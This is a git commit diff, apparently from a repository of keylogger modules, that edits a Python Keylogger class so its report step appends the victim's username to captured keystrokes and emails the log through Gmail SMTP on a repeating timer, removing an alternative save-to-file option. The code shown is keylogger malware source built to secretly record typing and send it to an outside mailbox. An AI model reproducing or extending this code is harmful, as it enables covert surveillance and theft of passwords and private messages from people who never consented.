a54c8f80b3c5f231c53304cd9fe1ab293575e7a6
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2022-08-28 23:25:20 +0530

    remove unwanted parts

--- modules/0.base_email.py
+++ modules/0.base_email.py
@@ -18,8 +18,6 @@ class Keylogger:
         self.interval = interval
         self.report_method = report_method
 
-        # this is the string variable that contains the log of all 
-        # the keystrokes within `self.interval`
         self.log = ""
 
         self.start_dt = datetime.now()
@@ -39,17 +37,6 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         self.log += name
     
-    def update_filename(self):
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
-
-    def report_to_file(self):
-
-        with open(f"{self.filename}.txt", "w") as f:
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
-
     def sendmail(self, to_email, email, password, message):
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         server.starttls()
@@ -59,14 +46,8 @@ class Keylogger:
 
     def report(self):
         if self.log:
-            self.end_dt = datetime.now()
-            self.update_filename()
-            if self.report_method == "email":
-                self.log += str(getuser()) + "\n"
-                self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.log += f"\n\n{getuser()}\n"
-                self.report_to_file()
+            self.log += str(getuser()) + "\n"
+            self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
